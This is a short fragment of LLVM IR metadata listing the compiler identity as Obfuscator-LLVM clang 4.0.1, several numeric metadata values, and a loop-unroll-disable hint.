!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146781110}
!2 = !{i32 -2146780704}
!3 = !{i32 -2146590635}
!4 = !{i32 -2146590226}
!5 = distinct !{!5, !6}
!6 = !{!"llvm.loop.unroll.disable"}
